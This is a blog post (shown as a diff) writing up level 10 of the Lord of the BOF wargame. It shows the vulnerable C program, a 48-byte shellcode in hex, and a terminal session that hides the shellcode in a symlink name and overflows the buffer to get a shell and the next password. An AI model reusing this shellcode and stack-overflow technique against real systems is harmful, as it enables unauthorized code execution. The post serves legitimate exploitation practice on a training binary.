@@ -1,0 +1,87 @@
+---
+layout: post
+title:  "[LOB]Level10. skeleton"
+subtitle:   "[LOB]vampire → skeleton"
+categories: LOB
+tags:
+- Wargame
+- LOB
+- Write-up
+---
+
+## keyword : argv hunter
+
+```c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - skeleton
+        - argv hunter
+*/
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+
+main(int argc, char *argv[])
+{
+	char buffer[40];
+	int i, saved_argc;
+
+	if(argc < 2){
+		printf("argv error\n");
+		exit(0);
+	}
+
+	// egghunter
+	for(i=0; environ[i]; i++)
+		memset(environ[i], 0, strlen(environ[i]));
+
+	if(argv[1][47] != '\xbf')
+	{
+		printf("stack is still your friend.\n");
+		exit(0);
+	}
+
+	// check the length of argument
+	if(strlen(argv[1]) > 48){
+		printf("argument is too long!\n");
+		exit(0);
+	}
+
+	// argc saver
+	saved_argc = argc;
+
+	strcpy(buffer, argv[1]);
+	printf("%s\n", buffer);
+
+    // buffer hunter
+    memset(buffer, 0, 40);
+
+	// ultra argv hunter!
+	for(i=0; i<saved_argc; i++)
+		memset(argv[i], 0, strlen(argv[i]));
+}
+```
+
+'\x2f'없는 shell(48byte) = \xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+
+egg hunter + buffer hunter + **argv hunter**
+
+```sh
+[vampire@localhost vampire]$ ln -sf skeleton `python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*100'`
+
+[vampire@localhost vampire]$ ./`python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*100'` `python -c 'print "A"*44+"\x30\xff\xff\xbf"'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0���
+bash$  my-pass
+euid = 510
+shellcoder
+bash$
+```
+
+
+
+> 심볼릭 링크 만들때 뒷부분에 NOP를 안넣으니 계속 segment fault가 떳다. 메모리 끝부분에 붙어있으면 잘 안된다고 한다.. 왤까....;;😢
+
+
+
+##### **skeleton / shellcoder**
